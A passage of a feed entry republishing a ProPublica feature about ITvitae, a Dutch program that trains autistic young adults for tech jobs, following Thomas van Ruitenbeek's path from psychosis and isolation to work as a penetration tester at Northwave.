candidates for 11 slots, de Winter explained the potential pitfalls. Autistic people tend to process language literally, she told them, and might be unable to respond to classic prompts. </p>\n<p>\\\nThe question “what do you hope to get from your time at ITvitae?” might elicit a blank stare. That’s because, to an autistic person, there’s no basis for what the outcomes of the new program might be. Alternatively, the list of answers could be endless and paralyzing. </p>\n<p>\\\nThey needed something concrete and technical to discuss. So de Bie concocted a simple tool that would serve as a discussion topic and gauge applicants’ computer interest: He asked the candidates to draw maps of their home computer networks and be prepared to describe them.</p>\n<p>\\\nVan Hofweegen and de Bie were full of enthusiasm. But, as they continued to talk with de Winter, they realized how much they still had to learn about the very people they wanted to help. They were, perhaps, in over their heads.</p>\n<p>\\\nFor as long as he could remember, van Ruitenbeek knew he was different but felt that he couldn’t let other people know that. It was as if he were “living undercover,” he said. He was constantly afraid that asking the wrong question would cause him to be bullied, so he never asked questions.</p>\n<p>\\\nWhile his twin sister played with other children, he withdrew to solitary activities, learning to design his own websites on topics ranging from outer space to dinosaurs. But his life took a darker turn after his psychotic episode in Utrecht.</p>\n<p>\\\nVan Ruitenbeek had planned to spend the summer day catching up on coursework when suddenly he began to feel that he was outside his own body. </p>\n<p>\\\nHis vision narrowed and his mind compelled him to follow what he believed were secret hand signals made by strangers, which eventually directed him to a bar to order a draft Heineken. He then lurched outside the bar in a stupor. </p>\n<p>\\\nVan Ruitenbeek rambled in halting, slurred speech when his sister and father reached him by phone. Frantic with worry, Henk van Ruitenbeek drove through Utrecht and eventually found his son standing on a sidewalk, staring vacantly. He got him in the car and took him home.</p>\n<p>\\\nIn the aftermath, with a new diagnosis of autism, van Ruitenbeek believed his life was over. He had thought it was not rational or even possible to set goals for himself. Then de Winter mentioned ITvitae, and he knew he badly wanted a slot there. </p>\n<p>\\\nThe ITvitae interview, he later said, was “like a ticket out of my situation.” More nervous than he had ever been, he told himself: “I have to make it. I have to do my best.”</p>\n<p>\\\nThe interview, which took place in late 2013, was difficult for everyone. Although van Hofweegen and de Bie were pleasant and upbeat, van Ruitenbeek felt he was in “hostile territory.” </p>\n<p>\\\nThen again, everything beyond his parents’ home seemed that way at the time. </p>\n<p>\\\nHe stuttered severely when describing his recovery from psychosis, and it took him an uncomfortably long time to utter a single sentence. He was visibly perspiring. “This isn’t working,” de Bie thought.</p>\n<p>\\\nWhen de Bie pivoted to the network drawing and other technical questions, the interview shifted. Van Ruitenbeek stuttered less. De Bie, impressed by his remarks about website design, decided before the interview ended that van Ruitenbeek should have a space at ITvitae.</p>\n<p>\\\nDe Bie thought it was obvious that van Ruitenbeek — and most of the other candidates — had raw computer talent. Van Hofweegen welled with tears. “What are these wonderful people doing at home?” he wondered.</p>\n<p>\\\nAdvocates for people with autism in the United States often ask the same question. </p>\n<p>\\\nParents of autistic teenagers describe the <a href=\"https://drexel.edu/autismoutcomes/blog/overview/2015/August/falling-off-the-services-cliff/\">“cliff” of high school or college graduation</a>, marked by the struggle to navigate the transition from years of special education and support to independent working life. </p>\n<p>\\\nFirm data is hard to come by, but some estimates suggest millions of autistic American adults are unemployed or underemployed. Of those who find work, most are in low-wage and part-time jobs, according to Drexel’s Autism Institute.</p>\n<p>\\\nAt the same time, demand for workers with technical skills has far outpaced supply. In the cybersecurity field alone, the U.S. faces a <a href=\"https://www.cyberseek.org/heatmap.html\">shortfall</a> of more than 225,000 workers, according to CyberSeek, an organization that provides job market data. </p>\n<p>\\\nThe number of available tech-related jobs in the U.S. nearly doubled from 2020 to 2021, analytics company <a href=\"https://datapeople.io/tech-hiring-report/state-of-the-tech-hiring-market/\">Datapeople reported</a>.</p>\n<p>\\\nOver the past decade, a variety of opportunities for autistic adults in the U.S. — ranging from technical training and job placement programs in various cities, to targeted hiring and retention efforts at large employers — have aimed to bridge the tech workforce gap. </p>\n<p>\\\nBut the results so far have been modest, said Michael Bernick, a San Francisco-based attorney who has written two books on employment strategies for the neurodiverse.</p>\n<p>\\\nThat’s partly because many initiatives <a href=\"https://hbr.org/2017/05/neurodiversity-as-a-competitive-advantage\">expect job candidates</a> to have higher education, credentials and the ability to work with minimal support, said Bernick, who was director of the California labor department from 1999 to 2004. “</p>\n<p>\\\nThey are looking for people who have significant tech skills,” he said. “Of that group, not all are college graduates, but they’re also not the long-term unemployed, sitting in their parents’ basements.” </p>\n<p>\\\nSomeone like van Ruitenbeek wouldn’t have stood a chance.</p>\n<p>\\\nOne widely publicized initiative is the Neurodiversity @ Work Employer Roundtable, a collection of about four dozen private employers — <a href=\"https://disabilityin.org/what-we-do/committees/neurodiversity-at-work-roundtable/\">including Microsoft, SAP, Google</a> and more — that foster neurodiversity hiring programs. </p>\n<p>\\\nParticipating companies offer screening and interview processes to accommodate autistic candidates; about 1,200 neurodiverse candidates have gotten jobs with Roundtable employers over the past decade, said Neil Barnett of Microsoft, a leader of the group. </p>\n<p>\\\nBarnett, who has discussed the initiative with Bernick, hopes that Roundtable employers will continue to expand their hiring of neurodiverse candidates with a variety of skills, including outside of tech.</p>\n<p>\\\nAutistic adults who are interested in computers represent just a sliver of autistic job seekers, according to the national advocacy organization Autism Speaks; Bernick puts the figure around 10% to 15%. </p>\n<p>\\\nDue in part to prominent figures such as Elon Musk, who has <a href=\"https://www.thestreet.com/markets/elon-musk-ted-talk\">said he has Asperger’s syndrome</a>, which is now considered a type of <a href=\"https://www.autismspeaks.org/types-autism-what-asperger-syndrome\">autism spectrum disorder</a>, and pop culture caricatures of socially awkward workers in Silicon Valley, the notion that autistic people inherently possess extraordinary tech competencies has become a cliché. </p>\n<p>\\\nBernick said he once had hopes of a tech career for his own autistic son. But his son had neither uncommon skills nor a deep interest in computers.</p>\n<p>\\\nWhile the 10% to 15% estimated by Bernick may seem like a small slice relative to popular perception, efforts to employ that group are nonetheless important, especially given the dramatic need in the tech sector, advocates and researchers said. </p>\n<p>\\\nBernick said programs in the U.S. should expand their efforts to find autistic job seekers who have computer capabilities but lack the credentials — precisely the types of people van Hofweegen and de Bie recruited for their inaugural class.</p>\n<p>\\\nIn February 2014, after a six-month stint cutting yarn, van Ruitenbeek rode his bicycle to ITvitae’s space for the first day of class. He was nervous. In social settings, he always felt as though he were “from another planet,” he said. </p>\n<p>\\\nHere, though, he was surrounded by people who felt the same way.</p>\n<p>\\\nShortly after their arrival, de Bie assigned the students to assemble the furniture they would be using. When he returned several hours later, he found they had put it together flawlessly. </p>\n<p>\\\nHe asked how everyone was getting along and discovered that none of the students had bothered with introductions. De Bie was surprised and amused; he was still learning how autistic people function.</p>\n<p>\\\nVan Hofweegen and de Bie, who refused to use the word “disability,” told the students they had “different operating systems” than the neurotypical people they grew up with. </p>\n<p>\\\nIt helped to reassure them that they belonged in the classroom, and eventually the workplace, as they all began to “learn how to learn again” following what for some was years away from school, van Hofweegen said. </p>\n<p>\\\nDe Bie eased the students into a school setting by leading a training on basic Microsoft programming, networking and security. That was followed by a 40-day course on software testing offered by an organization that issues certifications for technical specialties in the Netherlands.</p>\n<p>\\\nAfter only a short time, van Ruitenbeek said he began to feel “at home for the first time in my life.” He enjoyed his coursework and excelled at it. He gradually began interacting with other students as he felt more at ease and less afraid of making social mistakes. </p>\n<p>\\\nWhen he grumbled about commuting by bike, a classmate offered to drive him to and from ITvitae. Van Ruitenbeek gladly accepted.</p>\n<p>\\\nYet, for all his progress, van Ruitenbeek continued to face obstacles. Conversation remained difficult due to his stutter, and he lacked the energy to work the 32-hour week that most employers expected of ITvitae’s graduates. </p>\n<p>\\\nSometimes his father worried it was all too much for him. He was one of three students for whom van Hofweegen struggled to find a job.</p>\n<p>\\\nWhen the coursework drew to a close, the students took a formal exam to be certified in software testing. Van Ruitenbeek breezed through the questions, except for one that confounded him: None of the multiple choice answers were technically correct. </p>\n<p>\\\nSo he selected the answer that he suspected the test-maker wanted. He picked correctly and scored 100%. “It was my first achievement,” van Ruitenbeek said. “I could do something.”</p>\n<p>\\\nA short time later, a director from the testing company visited ITvitae and van Hofweegen told him that a student had spotted a mistake in the exam. Van Hofweegen, who has an uncanny ability to sense an opportunity and pounce, suggested that van Ruitenbeek could be a test reviewer. </p>\n<p>\\\nThe company invited him to join a small group of volunteers who look over exams for accuracy and clarity. Van Ruitenbeek readily agreed. To prepare, he plowed through a textbook on ethical hacking.</p>\n<p>\\\nThe work led him to his next self-discovery: Ethical hacking was fun. Once unable to set goals for the future, van Ruitenbeek now dreamed of a career in cybersecurity. He would hunt for hidden vulnerabilities in software and networks, and prevent them from falling prey to malicious hackers.</p>\n<p>\\\nFollowing the success of their first class, van Hofweegen and de Bie recruited another class, then another, each with a maximum of 14 students. </p>\n<p>\\\nAfter the first year, with steady revenue generated mainly from fees paid by employers, the co-founders began taking salaries, and they hired additional staff. ITvitae’s mission spread to autistic job seekers and their supporters across the Netherlands.</p>\n<p>\\\nAs the organization grew, van Hofweegen and de Bie relocated ITvitae to a floor in a former monastery, which had been converted into offices. The founders thought its tree-shaded walking paths and seclusion would impart a serenity that the students needed. </p>\n<p>\\\nThe organization also began offering new courses in software development, data science and cybersecurity, all specialties in high demand. </p>\n<p>\\\nStudents delighted in being able to focus exclusively on topics that fascinated them, a luxury — for many of the students, a necessity — that traditional educational settings couldn’t provide.</p>\n<p>\\\nCertain similarities emerged among ITvitae’s students. Before joining, nearly half had been sitting at home, unemployed and socially isolated, for longer than two years. Many passed the time playing video games and lost track of whether it was day or night. </p>\n<p>\\\nThey told van Hofweegen and de Bie they felt worthless and never fit in; many reported having been bullied and struggling through periods of depression.</p>\n<p>\\\nITvitae turned away about two-thirds of applicants, most frequently because of untreated mental health issues. Other candidates simply weren’t ready. One 2022 applicant said he hadn’t left his home for 10 years and spent most of his time gaming. </p>\n<p>\\\n“It was such a big thing for him to be here” for the interview, de Bie said. “But then traveling regularly, studying in a group, doing exams — that would have been too heavy for him. I had to tell him it’s not the right time.”</p>\n<p>\\\nMale students at ITvitae outnumber female students 10 to 1, both because autism is more prevalent in men and more likely to go undiagnosed or misdiagnosed in women. Many experience sensory challenges, such as headaches if the light is too bright or if there’s too much noise. </p>\n<p>\\\nOne student was distracted by the sound of blinking eyelashes. Most struggle to varying degrees with communication.</p>\n<p>\\\nTo help both prospective employers and job candidates work through the inevitable miscommunications, ITvitae staff members accompanied students to job interviews. </p>\n<p>\\\nSaskia Meeuwessen, who was hired as the CEO of ITvitae as it expanded, recalled joining a student at an interview for a cybersecurity job with the Dutch National Police. </p>\n<p>\\\nThe interviewer asked the candidate to introduce himself. The student froze: It wasn’t a question he had practiced. Nonetheless, he was later invited for a second meeting with an interviewer who was more experienced in interacting with autistic people.</p>\n<p>\\\nThat interviewer sat down and, with no social niceties, asked, “When I type www.google.nl, what happens?” Meeuwessen thought to herself, “Well, Google shows up, what a silly question.” </p>\n<p>\\\nBut the candidate had a completely different reaction, launching into nuanced details about internet servers and connections. For 90 minutes, Meeuwessen “sat there, listening to stuff that I really didn’t understand,” she said. The candidate was hired on the spot.</p>\n<p>\\\nThanks in part to its gradually sloped coastline, the Netherlands is a popular landing spot for the underwater fiber optic cables connecting the United States and Europe. Fast, reliable and inexpensive internet connectivity has fostered a flourishing tech sector. </p>\n<p>\\\nBut that connectivity has negative consequences, too. Hackers who can’t rely on the fragile internet connections in their home countries use servers in the Netherlands to commit crimes.</p>\n<p>\\\nTo counter these hackers, the Dutch National Police established an elite force called the High Tech Crime Unit, or HTCU. </p>\n<p>\\\nThe unit has become renowned both for its success disrupting the operations of cyberattackers and for its innovative culture, which for years has included hiring unconventional candidates, including those with autism.</p>\n<p>\\\nIn 2017, at van Hofweegen’s urging, the HTCU brought on a graduate from ITvitae. He proved to be an open-source intelligence wizard. Another graduate followed. </p>\n<p>\\\nThen the floodgates opened, and about 30 ITvitae graduates were eventually hired to jobs in regional police squads, where they handle data analysis, digital forensics and other technical specialties.</p>\n<p>\\\nThe National Police’s embrace of a neurodiverse workforce extended beyond its partnership with ITvitae. Its most renowned hiring initiative for autistic employees began with a 2016 murder case.</p>\n<p>\\\nA 50-year-old Turkish man <a href=\"https://www.hogeraad.nl/actueel/nieuwsoverzicht/2020/april/liquidatie-leiden/\">had been shot</a> more than 30 times in the Dutch city of Leiden and died two days later. The National Police collected surveillance camera footage and quickly identified the suspects. </p>\n<p>\\\nTheir work also seemed to link the murder to a number of cold cases in Amsterdam. The National Police took over those investigations, inheriting 1,700 hours of camera footage. Watching the tapes was a marathon of drudgery that none of the National Police detectives wanted to take on.</p>\n<p>\\\nOne National Police detective, Jory de Groot, happened upon an idea. De Groot, who has a foster brother with Down syndrome, volunteered with a group that organized trips for young adults with disabilities. On a weekend shortly after the murder, she led a <a href=\"https://www.autitravel.nl/?gclid=CjwKCAjwoMSWBhAdEiwAVJ2ndlaS5qbbSd6rgP0EzSVW4JrdWri3uLJ8a9x1nOpQQnhY1fNQQ7IPrxoC9vYQAvD_BwE\">group</a> of people with autism. </p>\n<p>\\\nDe Groot, then 26, described her job to one participant on the trip and mentioned the painstaking work of watching security footage. Some autistic people <a href=\"https://blogs.scientificamerican.com/beautiful-minds/autism-more-than-meets-the-eye/\">excel</a> at recognizing small details, the woman told de Groot. They might love the very task that neurotypical detectives loathe.</p>\n<p>\\\nDe Groot then contracted four people from <a href=\"https://www.autitalent.nl/\">AutiTalent</a>, a Dutch job placement organization for autistic people. She prepared her colleagues, advising them against asking typical get-to-know-you questions, and set up a radio-free office in a quiet corner of their building.</p>\n<p>\\\nWhen the autistic contractors arrived, the National Police detectives tested their abilities by having them watch the footage collected in the Leiden murder. </p>\n<p>\\\nThe detectives had already watched the tapes, which included the days leading up to the shooting, and knew precisely when the suspects would be seen on the day of the shooting.</p>\n<p>\\\nBefore long, one of the contractors spotted a suspect on the tape — but not when the detectives expected. The contractor found the suspect casing the crime scene the day before the attack. </p>\n<p>\\\nThe detectives had missed it. “It was really important evidence that we overlooked,” de Groot said. </p>\n<p>\\\nEventually, the two suspects were convicted in the Leiden murder.</p>\n<p>\\\nAs word of the feat reverberated through the National Police, requests for more AutiTalent contractors flooded in. Eventually, 50 autistic people were working as “camera footage specialists,” a newly created role, across the National Police.</p>\n<p>\\\n De Groot’s original team grew to six people, who increasingly talked with one another and with their police colleagues as they became more comfortable. </p>\n<p>\\\nThe contractors joined detectives from the start of investigations, rather than stepping in after they were already in progress, and took part in briefings. Additional contractors from AutiTalent became “audio specialists,” who transcribed interrogations and wiretaps.</p>\n<p>\\\nThe high profile of the contractors led some members of the National Police force to speak out about their own autism, which they’d previously hidden. </p>\n<p>\\\nThe outpouring prompted de Groot to work with those employees and an advocacy organization to establish an “Autism Embassy” at the National Police. </p>\n<p>\\\nNow about a dozen workplace “ambassadors” — employees with autism who volunteer for the role — offer an ear and advice to both autistic colleagues and their managers.</p>\n<p>\\\nThe National Police’s embrace of autistic contractors has been partially driven by government-proposed targets, accompanied by subsidies, for industry and government to hire 125,000 people who have difficulty finding work because of a disability. </p>\n<p>\\\nThat sort of government-centric approach is unlikely to occur in the U.S. Still, law enforcement agencies in the U.S. could draw lessons from the Dutch experiment, said Michael Bernick, the attorney who has focused on employment strategies for autistic people.</p>\n<p>\\\nAmid ITvitae’s successes, van Ruitenbeek was still floundering. He had enjoyed his time as a volunteer test reviewer in 2014, but it didn’t lead to a job. A subsequent internship with a computer security consultancy also didn’t land him permanent employment. </p>\n<p>\\\nYet another internship, with an organization that maintained supercomputers, failed when he experienced a psychotic episode in late 2016.</p>\n<p>\\\nIt happened when van Ruitenbeek was commuting to the company’s Amsterdam office by train. He knew public transportation was a stressor for him, but he thought he could push through it. He couldn’t. That day, he believed everyone on the train was talking about him. </p>\n<p>\\\nHe didn’t fully lose control, as he had in Utrecht. Still, he realized he couldn’t continue to commute and work normally with the organization any longer. He quit.</p>\n<p>\\\nIt had been more than two years since his ITvitae graduation, and van Ruitenbeek was again feeling hopeless. He mostly stayed at his parents’ home, where he tinkered with developing his own video game. </p>\n<p>\\\nHe sometimes rode his bike to ITvitae’s offices — “just as a place to go,” he said — where he read books on cybersecurity and tried to ground himself.</p>\n<p>\\\nVan Ruitenbeek happened to be at ITvitae one day in late 2017 when Pim Takkenberg, then a director at the Dutch cybersecurity firm Northwave and a former leader of the National Police’s High Tech Crime Unit, was there. </p>\n<p>\\\nEarlier that year, Takkenberg had overseen the development of a training program for ITvitae’s cybersecurity students. </p>\n<p>\\\nDuring the visit, van Hofweegen, ever scouting, made a request: “Pim, I have a person here, who is extremely vulnerable but extremely brilliant. I want you to talk to him.”</p>\n<p>\\\nAfter a brief chat, Takkenberg agreed to give van Ruitenbeek a “hack test” to assess his aptitude for penetration testing. The prospect alone was enough to help van Ruitenbeek regain some hope. </p>\n<p>\\\nA few months later, on exam day, Takkenberg instructed him to find vulnerabilities in a piece of software, which hackers could exploit to attack the hypothetical client. Takkenberg jokingly warned him not to cheat. </p>\n<p>\\\nVan Ruitenbeek took him literally, assuming he meant not to research anything on the internet. In reality, using the internet would have been allowed, even expected.</p>\n<p>\\\nVan Ruitenbeek found the main vulnerabilities. Takkenberg was impressed but remained skeptical. Van Ruitenbeek still had trouble with conversation, and he was able to work only three days a week. </p>\n<p>\\\nAddressing the doubts, van Hofweegen said: “You want a problem solved. He communicates better with computers than with people. In a technical world, it’s not so bad.”</p>\n<p>\\\nTakkenberg offered him a trial six-month internship. But he needed someone who could work 40 hours a week. They found a compromise. Van Ruitenbeek would start with three days a week, then gradually increase to five days. </p>\n<p>\\\nNorthwave also allowed van Ruitenbeek to work from home occasionally, a major concession before the pandemic. He went on a special diet and began exercising to improve his health and boost his energy. </p>\n<p>\\\nHe was determined to have a permanent place at Northwave, where he might finally gain the independence and fulfillment he’d long chased.</p>\n<p>\\\nOver their nearly nine years together as business partners, van Hofweegen and de Bie proved there was space in the labor market for people who had been overlooked by employers and who previously thought themselves to be shut out of the workforce. </p>\n<p>\\\nSince 2014, ITvitae has graduated and placed nearly 500 students in technical jobs spanning sectors from agriculture to chip manufacturing to law enforcement. </p>\n<p>\\\nBernick called that total “striking” and said, “We don’t have any company in the United States that comes near that number, even over a 10-year period.”</p>\n<p>\\\nDe Bie’s early assessment that employers would be willing to pay a fee to hire ITvitae’s graduates proved to be right. It costs the equivalent of $30,000 to educate, coach and find employment for each student. </p>\n<p>\\\nAbout a third of that is generated from tuition while the remainder comes from the employer.</p>\n<p>\\\nAs ITvitae’s Meeuwessen points out, autism doesn’t end when students gain employment. That’s why the organization provides regular coaching to help graduates navigate changes — anything from a new manager to a schedule shift — they perceive as disruptive and unsettling. </p>\n<p>\\\n“As soon as something happens, they start to doubt. If there’s doubt, they get unstable and that’s bad,” Meeuwessen said. “Most are doing just fine after many years, but it’s a process.”</p>\n<p>\\\nFor all the success, there have been setbacks. Even with coaching, some students struggle. ITvitae occasionally hears from an employer that a former student has stopped showing up to work and hasn’t responded to messages, sometimes for weeks. </p>\n<p>\\\n“We go to their houses,” van Hofweegen said. “We knock on the door. We call the parents. And we still can’t make them understand why they need to communicate with their employers.”</p>\n<p>\\\nA few times, the problems have been far more dire than an inability to show up at work. De Bie keeps a photo on his desk of a talented software programmer who specialized in a language called C#. After his graduation, he was hired by a prestigious global corporation. </p>\n<p>\\\nHis coach regularly checked in, and, by all appearances, his first few months at the company were successful. Then came word that the student had taken his life, one of three graduates to die by suicide. </p>\n<p>\\\nEven before graduating, the programmer had obtained an illegal drug from China with the intention of overdosing. He waited to take it. He wanted to finish his education and get a job to prove that he was capable of success. </p>\n<p>\\\n“For him, that was enough,” van Hofweegen said.</p>\n<p>\\\nWhen van Ruitenbeek started at Northwave in 2018, being in an office with other people scared him. Takkenberg knew that van Ruitenbeek wouldn’t be comfortable speaking to clients or even colleagues right away and tried to smooth the transition. </p>\n<p>\\\nHe and his team organized roles that accommodated van Ruitenbeek and other ITvitae graduates “in doing the things they’re good at and not doing the stuff they really hate to do.” </p>\n<p>\\\nSo, after van Ruitenbeek rooted out the vulnerabilities in a network, another colleague would meet with the client to explain the findings. </p>\n<p>\\\nThrough a government program for people who need work accommodations, de Winter helped van Ruitenbeek borrow a car so he could avoid the stress of public transportation.</p>\n<p>\\\nVan Ruitenbeek found an accepting culture at Northwave. He began to confide in colleagues, who looked after him. As van Ruitenbeek’s trust in them grew, he started asking questions and giving more than yes and no answers. </p>\n<p>\\\nHe successfully pursued a notoriously difficult, globally recognized certification for his line of work, which Takkenberg said was a “big sign” that the intern’s abilities were exceptional. </p>\n<p>\\\nOnce the internship ended, Takkenberg gave him a permanent job sniffing out gaps in software that could make it vulnerable to being penetrated by malicious hackers. </p>\n<p>\\\n“He is one of the best pen-testers we have,” Takkenberg said. “Because of his talent to focus and stay focused, he always will find the small details.”</p>\n<p>\\\nShortly after van Ruitenbeek started in his permanent position, he and Takkenberg discussed his goals for his first year. They decided van Ruitenbeek should find a CVE, short for common vulnerabilities and exposures, security flaws in software that are formally and publicly cataloged. </p>\n<p>\\\nTakkenberg was ecstatic when, by the midyear check-in, van Ruitenbeek had uncovered six. “OK, that goal is done,” Takkenberg said. “For the rest of the year, let’s focus on your social skills.”</p>\n<p>\\\nA short time later, van Ruitenbeek attended a company golf outing. Takkenberg, who retains the rough-around-the-edges demeanor of an ex-cop, joked that van Ruitenbeek would probably excel despite never having played. </p>\n<p>\\\n“We know you read eight books in a month for fun, Thomas,” he teased. “So you probably read a book about how to golf to prepare for this.” Van Ruitenbeek was able to recognize that Takkenberg was joking, something he’s sure would have eluded him in the past. </p>\n<p>\\\nIt was a revelation.</p>\n<p>\\\nThen, during a weekend retreat with his team, van Ruitenbeek carted along some records and a record player. Music had long been a passion that allowed him to express himself when he lacked the words to do so. </p>\n<p>\\\nOne evening, he worked up the courage to play records for about 15 of his colleagues. The airy, electronic music helped everyone relax. </p>\n<p>\\\nWord of his talent spread, and the next day, he found himself DJing a barbecue for Northwave’s entire cyber unit, more than 50 people.</p>\n<p>\\\nTakkenberg decided to splurge on a DJ booth for Northwave. He dubbed van Ruitenbeek the company’s official DJ and assigned him to play music at its Friday afternoon happy hours.</p>\n<p>\\\nVan Ruitenbeek became the center of Northwave’s social gatherings.</p>\n<p>\\\nVan Ruitenbeek spinning records at the company retreat Credit: Courtesy of Pim Takkenberg</p>\n<p>When COVID-19 hit, van Ruitenbeek found himself longing for the company of colleagues. </p>\n<p>\\\n“I mostly miss the casual chats,” he said of the days that he works from home, about half his schedule these days. “That is the biggest change of my life since Northwave,” he said. “Social development. Now I am outgoing.”</p>\n<p>\\\nVan Ruitenbeek has started mentoring a new autistic employee. He also began working with Northwave’s sales team to write proposals and even meet with clients. </p>\n<p>\\\nThat’s not to say there aren’t challenges. But now, when the workload feels too heavy, or he senses he’s becoming over-stressed, van Ruitenbeek asks for help. “I used to think I had to shoulder it on my own,” he said.</p>\n<p>\\\nNow 35, van Ruitenbeek is becoming financially independent. He received a promotion and raise. He leased his own car and, in 2021, with help from his family, van Ruitenbeek purchased a one-bedroom apartment just a short walk from them. </p>\n<p>\\\nGiving a tour of his new home, he showed off the view of a pond beyond the sliding doors of his living room. He had carefully organized scores of records on shelves below his DJ equipment. </p>\n<p>\\\nTucked away in a corner, he displayed the artifacts of his period of isolation: shelves filled with the Warhammer figurines he painted as he recovered from his psychosis.</p>\n<p>\\\nIf you meet van Ruitenbeek today, you wouldn’t likely guess his history. Compact and ruddy, he makes eye contact when he speaks — in fluent English when he was interviewed for this article — and is often self-deprecating and quick to smile. </p>\n<p>\\\nHis easy banter with his father, a reliable source of support, encouragement and protection, was unimaginable in the aftermath of his psychosis a decade ago.</p>\n<p>\\\nWhen he entered the working world, van Ruitenbeek had to consciously mimic social behavior and speech that he observed in peers. </p>\n<p>\\\nOver time, though, being social gradually became second nature. He felt like a foreign language student who once had to rehearse sentences in his mind but eventually spoke the new language fluently.</p>\n<p>\\\nIn April, van Ruitenbeek attended the graduation of this year’s cybersecurity class at ITvitae’s monastery, sitting among the new graduates’ families and friends on a drizzly afternoon. </p>\n<p>\\\nAn ITvitae manager named Jessica van der Ploeg told the 11 new graduates, who were going on to jobs at global bank ING, consulting giant Deloitte and the Dutch Ministry of Defense, “The job market is waiting for you, for your talent and for who you are.”</p>\n<p>\\\nVan der Ploeg acknowledged that many incoming ITvitae students feel shut out of society because of their autism, just as van Ruitenbeek once did. </p>\n<p>\\\nAlluding to an analogy ITvitae often uses to describe the communication gap between people with autism and their neurotypical peers, she said, “It’s us Windows users who sometimes don’t know how Linux works.”</p>\n<p>\\\nVan Ruitenbeek listened intently. At various points in his life, he had been unable to express emotion. Now he had tears streaming down his face.</p>\n<hr />\n<p><em>Photo by <a href=\"https://unsplash.com/@sigmund?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText\">Sigmund</a> on <a href=\"https://unsplash.com/s/photos/cybersecurity?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText\">Unsplash</a></em></p>","content:encodedSnippet":"This story was originally published on ProPublica by Renee Dudley.\n\\\nThomas van Ruitenbeek’s life fell apart in 2012, when a psychotic episode and a diagnosis of autism derailed his pursuit of a digital communication degree at a university in Utrecht, the Netherlands. \n\\\nFor the better part of a year, the 25-year-old wouldn’t respond when spoken to, his father said, and his blue, wide-set eyes revealed little cognition. He rarely left his parents’ duplex and filled his time studying daily newspapers, convinced they contained secret messages. \n\\\nSometimes, he worked up the energy to paint miniature figurines from the medieval fantasy-themed board game Warhammer. Mostly, he did nothing.\n\\\nThe psychotic episode and the autism diagnosis locked him into a state of isolation that had been deepening since his childhood, solidifying his long-held belief that he was an outsider. Van Ruitenbeek’s parents took him to appointments with doctors and therapists. \n\\\nWhen he grew strong enough, they supported his return to work. He did simple tasks — mostly cutting and packaging yarn — at a job he obtained through the local mental health department. \n\\\nThat was a far cry from his earlier aspirations of being a video game designer and hardly the life his parents had hoped he would have. They worried about what would happen when they grew old and could no longer look after him.\n\\\nThen, during a meeting with his coach at the mental health department in 2013, van Ruitenbeek and his parents got an unexpected bit of hope. \n\\\nA short distance away, a first-time entrepreneur named Peter van Hofweegen and his business partner were figuring out how to launch an education and job placement program geared toward autistic young adults who were interested in computers.\n\\\nThe number of people diagnosed with autism is hard to ascertain, but the statistics that are available suggest it’s on the rise. \n\\\nAn estimated 100,000 autistic Americans turn 18 every year, according to Drexel University’s Autism Institute, and a growing number of programs in the U.S. and elsewhere aim to employ tech-savvy autistic people.\n\\\nBut van Hofweegen’s program was something different. He and his partner sought primarily to recruit socially isolated, seemingly unemployable dropouts who almost certainly would be passed over even by employers who welcome candidates with neurological differences like autism. \n\\\nThey wanted people who couldn’t make it on their own and had been “sitting for years in their parents’ homes,” van Hofweegen said. The number of students in his program would be small, but the stakes were large. \n\\\nIf they could be doing meaningful, sophisticated work, what kind of a model might that provide for the uncounted numbers of people with autism around the world seemingly sentenced to constricted, unproductive lives.\n\\\nThe untested model drew skepticism even from other autism advocates, who viewed it as well-intentioned but overly idealistic. But van Ruitenbeek’s coach, Anita de Winter, saw it as a godsend. \n\\\nShe had worked with hundreds of autistic adults who struggled to find meaningful work and become independent. De Winter described the program to van Ruitenbeek without betraying her enthusiasm. She didn’t want him to be disappointed if it didn’t work out.\n\\\n“This might be for someone like you,” she told him.\n\\\nVan Hofweegen’s path to autism advocacy traces back to 1996, when his first child was born. The boy, named Thijs, sustained an injury during birth and was diagnosed with cerebral palsy. \n\\\nDoctors told van Hofweegen and his then-wife that Thijs might never walk or talk. But with the help of specialists, he learned to both move and speak.\n\\\nThijs went far beyond that. After proclaiming a desire to learn how to swim at age 5, and taking seven years to pass his basic swimming test, Thijs persisted through intermediate and advanced levels alongside much younger classmates. \n\\\nWhen he swam the 50-meter freestyle test to pass the advanced level, he earned a standing ovation from the other students’ parents. Van Hofweegen never forgot that moment. (He continued to ponder it even as Thijs developed into a competitive swimmer and won a silver medal in the men’s 400-meter freestyle at the Paralympic Games in 2016.) \n\\\nIt showed what a person could accomplish with the right support and accommodations.\n\\\nWhile helping out at an event in 2012 for people struggling with unemployment, van Hofweegen met Frans de Bie, an IT guru and fellow volunteer. A year earlier, de Bie had sold his 40-person tech company. Like van Hofweegen, de Bie drew inspiration from his personal life. \n\\\nHe had grown up alongside foster siblings, and he understood the transformative power of a supportive environment. He also was motivated by his son and daughter, who have dyslexia.\n\\\nThe new friends hit upon an idea. Van Hofweegen had read a survey saying 20,000 Dutch people were not participating in the workforce because of their autism. Perhaps they could start an organization that would help autistic people interested in technology to find work. \n\\\nAfter more than 25 years in management roles at hotels and at a temporary-job placement agency, van Hofweegen quit his job. A short time later, in late 2013, he and de Bie incorporated an organization they called ITvitae.\n\\\nThe Dutch have a saying: “God created the earth, but the Dutch created the Netherlands.” That’s because for centuries, the country’s citizens reclaimed land from the North Sea using their iconic system of dikes, canals and windmills. \n\\\nAbout a third of the country’s fertile land is below sea level. The Netherlands, half the size of South Carolina, remains among the world’s leading economies in part because its people have maximized its geographical resources.\n\\\nAnd so it was culturally ingrained in van Hofweegen and de Bie to maximize the country’s human resources. Partly because de Bie was familiar with the unmet demand for IT jobs in the Netherlands, a gap currently estimated at 100,000, and because the country has a robust tech sector, the co-founders wanted to focus on that area.\n\\\nThe two men saw ITvitae — the name is an amalgam of “information technology” and “curriculum vitae,” which they pronounce ee-tay-vee-tay — as a way to fill tech-sector jobs and strengthen the Dutch economy as much as they considered it a social enterprise to lift up autistic people who felt excluded from the job market.\n\\\nCommon traits found in autistic people often prevent them from being hired or even applying to jobs in the first place. They may struggle to interpret social cues, pause frequently when speaking, exhibit disruptive eccentricities or avoid eye contact. \n\\\nYet employers have found that other characteristics make them excellent employees. They tend to be thorough and fastidious, have the ability to go deep on specific topics and focus for prolonged periods of time. \n\\\nThose traits lend themselves to careers in technology and cybersecurity, among many other fields.\n\\\nVan Hofweegen and de Bie envisioned a six-month course focused on preparing students to be software testers — a natural fit for autistic people, who tend to be methodical rule-followers. \n\\\nAs the students embarked on coursework, van Hofweegen would find employers 